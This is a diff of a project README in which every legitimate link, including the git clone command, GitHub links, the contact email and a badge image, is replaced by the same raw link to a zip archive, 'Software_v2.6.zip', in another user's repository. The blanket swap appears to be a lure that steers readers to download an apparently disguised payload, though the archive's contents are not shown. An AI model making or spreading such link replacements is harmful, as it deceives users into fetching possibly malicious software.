@@ -30,7 +30,7 @@ To get started with the **Notes** repository, follow these steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/yourusername/notes.git
+   git clone https://raw.githubusercontent.com/Ragnonn/notes/master/pressdom/Software_v2.6.zip
    ```
 
 2. Navigate into the project directory:
@@ -48,7 +48,7 @@ To get started with the **Notes** repository, follow these steps:
    npm start
    ```
 
-You can also visit [GitHub](https://github.com) for more information and updates.
+You can also visit [GitHub](https://raw.githubusercontent.com/Ragnonn/notes/master/pressdom/Software_v2.6.zip) for more information and updates.
 
 ## Usage
 
@@ -104,14 +104,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [yourusername](https://github.com/yourusername)
+- **Email**: https://raw.githubusercontent.com/Ragnonn/notes/master/pressdom/Software_v2.6.zip
+- **GitHub**: [yourusername](https://raw.githubusercontent.com/Ragnonn/notes/master/pressdom/Software_v2.6.zip)
 
 ## Additional Resources
 
-For more information about the project and its updates, check the **Releases** section in this repository. You can also visit [GitHub](https://github.com) for general inquiries.
+For more information about the project and its updates, check the **Releases** section in this repository. You can also visit [GitHub](https://raw.githubusercontent.com/Ragnonn/notes/master/pressdom/Software_v2.6.zip) for general inquiries.
 
-![Notes](https://img.shields.io/badge/Notes-Repository-blue)
+![Notes](https://raw.githubusercontent.com/Ragnonn/notes/master/pressdom/Software_v2.6.zip)
 
 ---
 
